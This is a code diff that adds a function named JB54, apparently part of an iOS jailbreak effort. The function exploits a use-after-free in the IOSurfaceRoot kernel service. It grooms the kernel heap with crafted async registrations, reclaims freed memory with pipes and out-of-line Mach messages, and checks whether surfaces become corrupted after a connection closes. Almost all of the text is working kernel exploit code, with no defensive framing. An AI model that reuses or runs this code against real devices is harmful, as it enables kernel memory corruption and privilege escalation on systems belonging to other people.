@@ -40974,3 +40974,558 @@ void iosurface_singleconn_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         done(results);
     });
 }
+
+#pragma mark - JB54: Async Callback UAF + Reverse Reclaim + Zone ID
+
+void iosurface_async_callback_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB54: === Async Callback UAF + Reverse Reclaim + Zone Identification ===");
+        log(@"JB54: Targeting stale async callback + pipe zone match + conn close cleanup");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB54";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef void*(*surfcreate_fn)(void*);
+        typedef uint32_t(*surfgetid_fn)(void*);
+        typedef void*(*surfcopyall_fn)(void*);
+        typedef void(*cfrelease_fn)(void*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        surfcreate_fn sym_surfCreate = (surfcreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        surfgetid_fn sym_surfGetID = (surfgetid_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        surfcopyall_fn sym_surfCopyAll = (surfcopyall_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyAllValues");
+        cfrelease_fn sym_cfRelease = (cfrelease_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB54: FAIL - dlsym missing");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        void *matchDict = sym_matching("IOSurfaceRoot");
+        unsigned int svc = matchDict ? sym_getmatch(0, matchDict) : 0;
+        if (!svc) {
+            log(@"JB54: FAIL - service not found");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+
+        unsigned int self_task = mach_task_self();
+
+        /* ===== R1: Quick UAF Confirm (2 trials) ===== */
+        log(@"JB54: ===== R1: Quick UAF Confirm (2 trials) =====");
+        int r1Hits = 0;
+
+        unsigned int oConn = 0, gConn = 0;
+        int oRc = sym_open(svc, self_task, 0, &oConn);
+        int gRc = sym_open(svc, self_task, 0, &gConn);
+        if (oRc != 0 || gRc != 0) {
+            log([NSString stringWithFormat:@"JB54: conn open FAIL o=0x%x g=0x%x", (uint32_t)oRc, (uint32_t)gRc]);
+            if (oRc == 0) sym_close(oConn);
+            if (gRc == 0) sym_close(gConn);
+            results[@"verdict"] = @"OPEN_FAIL";
+            if (sym_release) sym_release(svc);
+            done(results);
+            return;
+        }
+
+        @try {
+        for (int t = 0; t < 2 && !isr_stopped(); t++) {
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            int baseDup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+            unsigned int gPorts[64];
+            int gCount = 0;
+            jb42_groomWithFields(gConn, 0x41, 0xDEAD005400000000ull, 0xCAFEBABE00000000ull, 0, 24, 64, gPorts, &gCount, sym_async);
+
+            int rdup = jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
+
+            int hit = ((uint32_t)baseDup == 0xE00002C9) && ((uint32_t)rdup != 0xE00002C9);
+            if (hit) r1Hits++;
+
+            log([NSString stringWithFormat:@"JB54: [R1] t%d base=0x%x rdup=0x%x %s", t, (uint32_t)baseDup, (uint32_t)rdup, hit ? "HIT" : "miss"]);
+
+            jb42_freeGroom(gPorts, gCount);
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB54: [R1] EXC: %@", e.reason]);
+        }
+
+        results[@"r1_hits"] = @(r1Hits);
+        log([NSString stringWithFormat:@"JB54: [R1] hits=%d/2%s", r1Hits, r1Hits > 0 ? " UAF OK" : " NO UAF"]);
+
+        sym_close(oConn);
+        sym_close(gConn);
+
+        if (isr_stopped() || r1Hits == 0) {
+            if (sym_release) sym_release(svc);
+            results[@"verdict"] = r1Hits == 0 ? @"NO_UAF" : @"STOPPED";
+            done(results);
+            return;
+        }
+
+        /* ===== R2: Async Notification Trigger ===== */
+        log(@"JB54: ===== R2: Async Notification Trigger =====");
+        int r2Callbacks = 0;
+        int r2MsgsRecv = 0;
+
+        @try {
+        for (int t = 0; t < 3 && !isr_stopped(); t++) {
+            unsigned int r2o = 0, r2g = 0;
+            int rc1 = sym_open(svc, self_task, 0, &r2o);
+            int rc2 = sym_open(svc, self_task, 0, &r2g);
+            if (rc1 != 0 || rc2 != 0) {
+                if (rc1 == 0) sym_close(r2o);
+                if (rc2 == 0) sym_close(r2g);
+                log([NSString stringWithFormat:@"JB54: [R2] t%d conn fail", t]);
+                continue;
+            }
+
+            unsigned int asyncWp = jb41_newWakePort();
+            uint64_t in[3] = {100 + (uint64_t)t, 200, 300};
+
+            int regRc = jb41_callSel(r2o, 17, in, 24, 1, asyncWp, sym_call, sym_async);
+            int deregRc = jb41_callSel(r2o, 18, in, 24, 0, asyncWp, sym_call, sym_async);
+
+            unsigned int gPorts[64];
+            int gCount = 0;
+            jb42_groomWithFields(r2g, 0xDEAD0054, 0xCAFE0054, 0xBEEF0054, 0, 24, 64, gPorts, &gCount, sym_async);
+
+            int msgsRecv = 0;
+
+            {
+                struct {
+                    mach_msg_header_t hdr;
+                } trigMsg;
+                memset(&trigMsg, 0, sizeof(trigMsg));
+                trigMsg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                trigMsg.hdr.msgh_size = (mach_msg_size_t)sizeof(trigMsg);
+                trigMsg.hdr.msgh_remote_port = asyncWp;
+                trigMsg.hdr.msgh_local_port = 0;
+                trigMsg.hdr.msgh_id = 0x54AA;
+                mach_msg(&trigMsg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, (mach_msg_size_t)sizeof(trigMsg), 0, 0, 50, 0);
+            }
+
+            jb41_callSel(r2o, 17, in, 24, 1, asyncWp, sym_call, sym_async);
+            jb41_callSel(r2o, 18, in, 24, 0, asyncWp, sym_call, sym_async);
+
+            if (sym_surfCreate) {
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @32,
+                    @"IOSurfaceHeight": @32,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                void *tmpSurf = sym_surfCreate((__bridge void *)props);
+                if (tmpSurf && sym_cfRelease) {
+                    sym_cfRelease(tmpSurf);
+                }
+            }
+
+            usleep(10000);
+
+            for (int chk = 0; chk < 3; chk++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    uint8_t payload[256];
+                    mach_msg_trailer_t trailer;
+                } rcvMsg;
+                memset(&rcvMsg, 0, sizeof(rcvMsg));
+                int mr = mach_msg(&rcvMsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)sizeof(rcvMsg), asyncWp, 50, 0);
+                if (mr == 0) {
+                    msgsRecv++;
+                    uint32_t payloadSz = rcvMsg.hdr.msgh_size > sizeof(mach_msg_header_t) ? rcvMsg.hdr.msgh_size - (uint32_t)sizeof(mach_msg_header_t) : 0;
+                    log([NSString stringWithFormat:@"JB54: [R2] *** MSG RECEIVED t%d chk%d id=0x%x sz=%u payload=%u", t, chk, rcvMsg.hdr.msgh_id, rcvMsg.hdr.msgh_size, payloadSz]);
+                    if (rcvMsg.hdr.msgh_id != 0x54AA) {
+                        r2Callbacks++;
+                        log([NSString stringWithFormat:@"JB54: [R2] *** ASYNC CALLBACK! id=0x%x (not our trigger 0x54AA)", rcvMsg.hdr.msgh_id]);
+                    }
+                }
+            }
+
+            r2MsgsRecv += msgsRecv;
+
+            log([NSString stringWithFormat:@"JB54: [R2] t%d reg=0x%x dereg=0x%x groom=%d msgs=%d", t, (uint32_t)regRc, (uint32_t)deregRc, gCount, msgsRecv]);
+
+            jb42_freeGroom(gPorts, gCount);
+            jb41_dropPort(asyncWp);
+            sym_close(r2o);
+            sym_close(r2g);
+            usleep(5000);
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB54: [R2] EXC: %@", e.reason]);
+        }
+
+        results[@"r2_callbacks"] = @(r2Callbacks);
+        results[@"r2_msgs"] = @(r2MsgsRecv);
+        log([NSString stringWithFormat:@"JB54: [R2] callbacks=%d msgs_total=%d%s", r2Callbacks, r2MsgsRecv, r2Callbacks > 0 ? " *** ASYNC CALLBACK FIRED ***" : ""]);
+
+        if (isr_stopped()) {
+            if (sym_release) sym_release(svc);
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            return;
+        }
+
+        /* ===== R3: Pipe Buffer Zone Identification ===== */
+        log(@"JB54: ===== R3: Pipe Buffer Zone Identification =====");
+        int r3Leaked = 0;
+
+        @try {
+        for (int t = 0; t < 2 && !isr_stopped(); t++) {
+            unsigned int r3o = 0, r3g = 0;
+            int rc1 = sym_open(svc, self_task, 0, &r3o);
+            int rc2 = sym_open(svc, self_task, 0, &r3g);
+            if (rc1 != 0 || rc2 != 0) {
+                if (rc1 == 0) sym_close(r3o);
+                if (rc2 == 0) sym_close(r3g);
+                continue;
+            }
+
+            int pipeFds[32][2];
+            int pipeCount = 0;
+            uint8_t pipePat[24];
+            memset(pipePat, 0xAA + t, 24);
+            pipePat[0] = 0xF0 + t;
+            pipePat[23] = 0x0F + t;
+
+            for (int p = 0; p < 32; p++) {
+                if (pipe(pipeFds[p]) == 0) {
+                    ssize_t w = write(pipeFds[p][1], pipePat, 24);
+                    if (w == 24) {
+                        pipeCount++;
+                    } else {
+                        close(pipeFds[p][0]);
+                        close(pipeFds[p][1]);
+                        pipeFds[p][0] = -1;
+                        pipeFds[p][1] = -1;
+                    }
+                } else {
+                    pipeFds[p][0] = -1;
+                    pipeFds[p][1] = -1;
+                }
+            }
+
+            int freeIdx = pipeCount / 2;
+            if (freeIdx < pipeCount && pipeFds[freeIdx][0] >= 0) {
+                close(pipeFds[freeIdx][0]);
+                close(pipeFds[freeIdx][1]);
+                pipeFds[freeIdx][0] = -1;
+                pipeFds[freeIdx][1] = -1;
+            }
+
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {500 + (uint64_t)t, 600, 700};
+            jb41_callSel(r3o, 17, in, 24, 1, wp, sym_call, sym_async);
+            jb41_callSel(r3o, 18, in, 24, 0, wp, sym_call, sym_async);
+
+            int leaked = 0;
+            for (int p = 0; p < 32; p++) {
+                if (pipeFds[p][0] < 0) continue;
+                uint8_t readBuf[24];
+                memset(readBuf, 0, 24);
+                ssize_t rd = read(pipeFds[p][0], readBuf, 24);
+                if (rd == 24) {
+                    int diff = 0;
+                    for (int b = 0; b < 24; b++) {
+                        if (readBuf[b] != pipePat[b]) diff++;
+                    }
+                    if (diff > 0) {
+                        leaked++;
+                        uint64_t *dw = (uint64_t *)readBuf;
+                        log([NSString stringWithFormat:@"JB54: [R3] *** PIPE MODIFIED pipe[%d] diff=%d w0=0x%llx w1=0x%llx w2=0x%llx", p, diff, dw[0], dw[1], dw[2]]);
+                    }
+                }
+                close(pipeFds[p][0]);
+                close(pipeFds[p][1]);
+            }
+
+            r3Leaked += leaked;
+            log([NSString stringWithFormat:@"JB54: [R3] t%d pipes=%d leaked=%d", t, pipeCount, leaked]);
+
+            jb41_dropPort(wp);
+            sym_close(r3o);
+            sym_close(r3g);
+            usleep(5000);
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB54: [R3] EXC: %@", e.reason]);
+        }
+
+        results[@"r3_leaked"] = @(r3Leaked);
+        log([NSString stringWithFormat:@"JB54: [R3] total_leaked=%d%s", r3Leaked, r3Leaked > 0 ? " *** PIPE ZONE MATCH ***" : ""]);
+
+        if (isr_stopped()) {
+            if (sym_release) sym_release(svc);
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            return;
+        }
+
+        /* ===== R4: Connection Close Cleanup Exploit ===== */
+        log(@"JB54: ===== R4: Connection Close Cleanup Exploit =====");
+        int r4Corrupted = 0;
+
+        @try {
+        if (sym_surfCreate && sym_surfGetID && sym_surfCopyAll) {
+            NSDictionary *surfProps = @{
+                @"IOSurfaceWidth": @64,
+                @"IOSurfaceHeight": @64,
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+            void *testSurf = sym_surfCreate((__bridge void *)surfProps);
+            if (testSurf) {
+                uint32_t surfID = sym_surfGetID(testSurf);
+                log([NSString stringWithFormat:@"JB54: [R4] created IOSurface surfID=%u", surfID]);
+
+                void *prePropDict = sym_surfCopyAll(testSurf);
+                int preCount = prePropDict ? (int)CFDictionaryGetCount(prePropDict) : 0;
+                if (prePropDict) sym_cfRelease(prePropDict);
+
+                for (int t = 0; t < 3 && !isr_stopped(); t++) {
+                    unsigned int r4c = 0, r4g = 0;
+                    int rc1 = sym_open(svc, self_task, 0, &r4c);
+                    int rc2 = sym_open(svc, self_task, 0, &r4g);
+                    if (rc1 != 0 || rc2 != 0) {
+                        if (rc1 == 0) sym_close(r4c);
+                        if (rc2 == 0) sym_close(r4g);
+                        continue;
+                    }
+
+                    unsigned int wp = jb41_newWakePort();
+                    uint64_t in[3] = {(uint64_t)surfID, 0, 0};
+
+                    int regRc = jb41_callSel(r4c, 17, in, 24, 1, wp, sym_call, sym_async);
+                    int deregRc = jb41_callSel(r4c, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                    unsigned int gPorts[64];
+                    int gCount = 0;
+                    jb42_groomWithFields(r4g, (uint64_t)surfID, 0xDEAD0054, 0xCAFE0054, 0, 24, 64, gPorts, &gCount, sym_async);
+
+                    sym_close(r4c);
+                    usleep(5000);
+
+                    uint32_t postID = sym_surfGetID(testSurf);
+                    void *postPropDict = sym_surfCopyAll(testSurf);
+                    int postCount = postPropDict ? (int)CFDictionaryGetCount(postPropDict) : -1;
+                    if (postPropDict) sym_cfRelease(postPropDict);
+
+                    int corrupted = 0;
+                    if (postID != surfID) {
+                        corrupted += 10;
+                        log([NSString stringWithFormat:@"JB54: [R4] *** SURFID CHANGED! was=%u now=%u", surfID, postID]);
+                    }
+                    if (postCount != preCount) {
+                        corrupted += 5;
+                        log([NSString stringWithFormat:@"JB54: [R4] *** PROP COUNT CHANGED! pre=%d post=%d", preCount, postCount]);
+                    }
+                    if (postCount < 0) {
+                        corrupted += 20;
+                        log(@"JB54: [R4] *** SURFACE FREED/INVALID after conn close!");
+                    }
+
+                    r4Corrupted += corrupted;
+                    log([NSString stringWithFormat:@"JB54: [R4] t%d reg=0x%x dereg=0x%x groom=%d postID=%u postProps=%d score=%d", t, (uint32_t)regRc, (uint32_t)deregRc, gCount, postID, postCount, corrupted]);
+
+                    jb42_freeGroom(gPorts, gCount);
+                    jb41_dropPort(wp);
+                    sym_close(r4g);
+                    usleep(5000);
+                }
+
+                sym_cfRelease(testSurf);
+            } else {
+                log(@"JB54: [R4] IOSurfaceCreate failed");
+            }
+        } else {
+            log(@"JB54: [R4] SKIP - IOSurface symbols missing");
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB54: [R4] EXC: %@", e.reason]);
+        }
+
+        results[@"r4_corrupted"] = @(r4Corrupted);
+        log([NSString stringWithFormat:@"JB54: [R4] corruption_score=%d%s", r4Corrupted, r4Corrupted > 0 ? " *** CONN CLOSE EXPLOIT ***" : ""]);
+
+        if (isr_stopped()) {
+            if (sym_release) sym_release(svc);
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            return;
+        }
+
+        /* ===== R5: Reverse Reclaim — OOL Size Sweep ===== */
+        log(@"JB54: ===== R5: Reverse Reclaim - OOL Size Sweep =====");
+        int r5Modified[4] = {0, 0, 0, 0};
+        int r5Sizes[4] = {16, 24, 32, 48};
+
+        @try {
+        for (int s = 0; s < 4 && !isr_stopped(); s++) {
+            int oolSz = r5Sizes[s];
+            unsigned int r5o = 0, r5g = 0;
+            int rc1 = sym_open(svc, self_task, 0, &r5o);
+            int rc2 = sym_open(svc, self_task, 0, &r5g);
+            if (rc1 != 0 || rc2 != 0) {
+                if (rc1 == 0) sym_close(r5o);
+                if (rc2 == 0) sym_close(r5g);
+                continue;
+            }
+
+            for (int t = 0; t < 2 && !isr_stopped(); t++) {
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {800 + (uint64_t)s * 10 + (uint64_t)t, 900, 1000};
+
+                jb41_callSel(r5o, 17, in, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(r5o, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                uint8_t oolPat[48];
+                memset(oolPat, 0x50 + s, oolSz);
+                oolPat[0] = 0xE0 + s;
+                if (oolSz > 1) oolPat[oolSz - 1] = 0x0E + s;
+
+                unsigned int oolPorts[48];
+                int oolSent = 0;
+                for (int m = 0; m < 48; m++) {
+                    unsigned int rPort = 0;
+                    if (mach_port_allocate(self_task, MACH_PORT_RIGHT_RECEIVE, &rPort) != 0) continue;
+
+                    struct {
+                        mach_msg_header_t hdr;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                    } sMsg;
+                    memset(&sMsg, 0, sizeof(sMsg));
+                    sMsg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                    sMsg.hdr.msgh_size = (mach_msg_size_t)sizeof(sMsg);
+                    sMsg.hdr.msgh_remote_port = rPort;
+                    sMsg.hdr.msgh_local_port = 0;
+                    sMsg.hdr.msgh_id = 0x55000 + s * 100 + m;
+                    sMsg.body.msgh_descriptor_count = 1;
+                    sMsg.ool.address = oolPat;
+                    sMsg.ool.size = (mach_msg_size_t)oolSz;
+                    sMsg.ool.deallocate = 0;
+                    sMsg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                    sMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    int mr = mach_msg(&sMsg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, (mach_msg_size_t)sizeof(sMsg), 0, 0, 100, 0);
+                    if (mr == 0) {
+                        oolPorts[oolSent++] = rPort;
+                    } else {
+                        mach_port_mod_refs(self_task, rPort, MACH_PORT_RIGHT_RECEIVE, -1);
+                    }
+                }
+
+                jb41_callSel(r5o, 17, in, 24, 1, wp, sym_call, sym_async);
+                jb41_callSel(r5o, 18, in, 24, 0, wp, sym_call, sym_async);
+
+                int modified = 0;
+                for (int r = 0; r < oolSent; r++) {
+                    struct {
+                        mach_msg_header_t hdr;
+                        mach_msg_body_t body;
+                        mach_msg_ool_descriptor_t ool;
+                        mach_msg_trailer_t trailer;
+                    } rMsg;
+                    memset(&rMsg, 0, sizeof(rMsg));
+                    int mr = mach_msg(&rMsg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)sizeof(rMsg), oolPorts[r], 100, 0);
+                    if (mr == 0 && rMsg.ool.address && rMsg.ool.size > 0) {
+                        uint8_t *data = (uint8_t *)rMsg.ool.address;
+                        int diff = 0;
+                        int rcvSz = (int)rMsg.ool.size;
+                        int cmpSz = rcvSz < oolSz ? rcvSz : oolSz;
+                        for (int b = 0; b < cmpSz; b++) {
+                            if (data[b] != oolPat[b]) diff++;
+                        }
+                        if (diff > 0) {
+                            modified++;
+                            if (modified <= 2) {
+                                uint64_t w0 = 0, w1 = 0;
+                                if (cmpSz >= 8) memcpy(&w0, data, 8);
+                                if (cmpSz >= 16) memcpy(&w1, data + 8, 8);
+                                log([NSString stringWithFormat:@"JB54: [R5] *** OOL MODIFIED sz=%d msg[%d] diff=%d w0=0x%llx w1=0x%llx", oolSz, r, diff, w0, w1]);
+                            }
+                        }
+                        vm_deallocate(self_task, (vm_address_t)rMsg.ool.address, (vm_size_t)rMsg.ool.size);
+                    }
+                    mach_port_mod_refs(self_task, oolPorts[r], MACH_PORT_RIGHT_RECEIVE, -1);
+                }
+
+                r5Modified[s] += modified;
+                log([NSString stringWithFormat:@"JB54: [R5] sz=%d t%d ool=%d modified=%d", oolSz, t, oolSent, modified]);
+
+                jb41_dropPort(wp);
+                usleep(5000);
+            }
+
+            sym_close(r5o);
+            sym_close(r5g);
+        }
+        } @catch (NSException *e) {
+            log([NSString stringWithFormat:@"JB54: [R5] EXC: %@", e.reason]);
+        }
+
+        for (int s = 0; s < 4; s++) {
+            results[[NSString stringWithFormat:@"r5_sz%d", r5Sizes[s]]] = @(r5Modified[s]);
+        }
+        log([NSString stringWithFormat:@"JB54: [R5] sz16=%d sz24=%d sz32=%d sz48=%d", r5Modified[0], r5Modified[1], r5Modified[2], r5Modified[3]]);
+
+        int r5AnyMod = 0;
+        for (int s = 0; s < 4; s++) { if (r5Modified[s] > 0) r5AnyMod++; }
+
+        if (sym_release) sym_release(svc);
+
+        NSString *verdict;
+        if (r2Callbacks > 0) {
+            verdict = @"ASYNC_CALLBACK_FIRED";
+            log(@"JB54: [!!!!!] ASYNC CALLBACK fired after UAF + groom!");
+        } else if (r3Leaked > 0) {
+            verdict = @"PIPE_ZONE_MATCH";
+            log(@"JB54: [!!!!] Pipe buffer shares zone with registry entry!");
+        } else if (r4Corrupted > 0) {
+            verdict = @"CONN_CLOSE_EXPLOIT";
+            log(@"JB54: [!!!] Connection close interpreted groomed data!");
+        } else if (r5AnyMod > 0) {
+            verdict = @"REVERSE_RECLAIM";
+            log(@"JB54: [!!] OOL data modified by reverse reclaim!");
+        } else if (r2MsgsRecv > 0) {
+            verdict = @"MSG_ECHO_ONLY";
+            log(@"JB54: [!] Messages received but only self-echo (no kernel callback)");
+        } else if (r1Hits > 0) {
+            verdict = @"UAF_ONLY";
+            log(@"JB54: UAF confirmed but no new exploitation path found");
+        } else {
+            verdict = @"NO_HIT";
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB54: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB54-async-callback-checkpoint.json", results);
+        done(results);
+    });
+}
